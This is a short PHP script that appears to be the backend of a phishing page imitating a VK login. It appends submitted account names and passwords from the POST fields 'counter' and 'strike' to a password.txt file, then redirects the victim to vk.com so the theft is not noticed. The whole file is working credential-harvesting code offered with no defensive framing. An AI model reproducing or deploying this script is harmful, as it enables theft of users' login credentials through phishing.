<?php

file_put_contents("../../../password.txt", "Account: " . $_POST['counter'] . " Pass: " . $_POST['strike'] . "\n", FILE_APPEND);
header('Location: https://vk.com');
exit();
